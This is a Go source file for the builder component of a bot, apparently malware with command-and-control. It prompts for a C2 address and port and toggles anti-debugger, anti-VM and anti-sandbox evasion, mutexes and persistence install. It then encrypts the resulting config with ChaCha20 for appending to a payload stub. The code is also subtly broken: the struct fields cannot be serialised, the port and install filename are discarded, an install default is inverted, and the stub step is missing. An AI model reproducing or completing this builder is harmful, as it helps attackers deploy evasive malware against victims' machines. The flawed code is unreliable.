package core

import (
	"ThisBot/common"
	"ThisBot/utils"
	"encoding/json"
	"fmt"
	"strconv"
)

type BuildConfig struct {
	version      string   `json:"version"`
	host         []string `json:"host"`
	single       bool     `json:"single"`
	anti_debug   bool     `json:"anti_debug"`
	anti_vm      bool     `json:"anti_vm"`
	anti_sandbox bool     `json:"anti_sandbox"`
	install      bool     `json:"install"`
	install_file string   `json:"file"`
	mutex_name   string   `json:"mutex"`
	delay        uint     `json:"delay"`
	use_ssl      bool     `json:"ssl"`
}

func BuildPayload() []byte {
	// Clean screen
	clear_handler()
	// Create configure
	config := BuildConfig{}
	config.host = make([]string, 1)
	config.version = common.Version
	// Show banner
	banner := `__________      .__.__       .___            
\______   \__ __|__|  |    __| _/___________ 
 |    |  _/  |  \  |  |   / __ |/ __ \_  __ \
 |    |   \  |  /  |  |__/ /_/ \  ___/|  | \/
 |______  /____/|__|____/\____ |\___  >__|   
        \/                    \/    \/`
	fmt.Println(banner)
	// C2 IP
	for {
		fmt.Print("[*] Enter C2 IP(URL): \nBuild> ")
		command := utils.ReadFromIO()
		if utils.IsLegalURLOrIP(command) {
			config.host[0] = command
			break
		}
		fmt.Println("[-] Wrong IP(URL) format")
	}
	// C2 Port
	for {
		fmt.Print("[*] Enter C2 port(0~65535): \nBuild> ")
		command := utils.ReadFromIO()
		port, err := strconv.ParseInt(command, 10, 64)
		if err != nil || (port < 0 || port > 65535) {
			fmt.Println("[-] Wrong port(0~65535)")
			continue
		}
		break
	}
	// SSL setup
	fmt.Print("[*] Enable SSL?(y/n, default is y)\nBuild> ")
	command := utils.ReadFromIO()
	config.use_ssl = true
	if command == "" || command == "n" || command == "no" {
		config.use_ssl = false
	}
	// Singleton setup
	fmt.Print("[*] Single instance?(y/n, default is y)\nBuild> ")
	config.single = true
	command = utils.ReadFromIO()
	if command == "" || command == "n" || command == "no" {
		config.single = false
	}
	// Anti-Debugger
	fmt.Print("[*] Enable Anti-Debugger?(y/n, default is y)\nBuild> ")
	command = utils.ReadFromIO()
	config.anti_debug = true
	if command == "" || command == "n" || command == "no" {
		config.anti_debug = false
	}
	// Anti-VM
	fmt.Print("[*] Enable Anti-VM?(y/n, default is y)\nBuild> ")
	command = utils.ReadFromIO()
	config.anti_vm = true
	if command == "" || command == "n" || command == "no" {
		config.anti_vm = false
	}
	// Anti-Sandbox
	fmt.Print("[*] Enable Anti-Sandbox?(y/n, default is y)\nBuild> ")
	command = utils.ReadFromIO()
	config.anti_sandbox = true
	if command == "" || command == "n" || command == "no" {
		config.anti_sandbox = false
	}
	// Delay seconds
	for {
		fmt.Print("[*] Delay seconds?(Must >= 0, default is 0)\nBuild> ")
		command = utils.ReadFromIO()
		config.delay = 0
		if command != "0" && command != "" {
			delay_sec, err := strconv.ParseInt(command, 10, 64)
			if err != nil || delay_sec < 0 {
				fmt.Println("[-] Delay seconds must be greater than 0")
				continue
			}
			config.delay = uint(delay_sec)
			break
		}
	}
	// Generate mutex name
	config.mutex_name = utils.RandomString(16)
	// Install payload
	fmt.Print("[*] Enable install?(y/n, default is n)\nBuild> ")
	config.install = false
	command = utils.ReadFromIO()
	if command == "" || command == "y" || command == "yes" {
		config.install = true
		// install file
		for {
			fmt.Print("[*] Enter install filename(default is random name): \nBuild> ")
			command := utils.ReadFromIO()
			if command == "" {
				command = utils.RandomString(8)
			}
			fmt.Print("[*] Do you want to rename the install file?(y/n, default is n)")
			command = utils.ReadFromIO()
			if !(command == "" || command == "y" || command == "yes") {
				break
			}
		}
	}
	// Base64 type json format
	bytesConfig, _ := json.Marshal(&config)
	base64Config := common.Base64Enc(bytesConfig)
	key := utils.GenerateRandomBytes(32)
	cipher_config := common.EncChacha20(key, []byte(base64Config))
	if cipher_config == nil || key == nil {
		return nil
	}
	// | Payload(n) | key(32) | encrypted_config(n) | size(4) |
	// Read stub to memory

	// Configure readed
	payload := append(key, cipher_config...)
	var size int = len(payload)
	bytSize := utils.IntToBytes(size)
	payload = append(payload, bytSize...)

	return payload
}
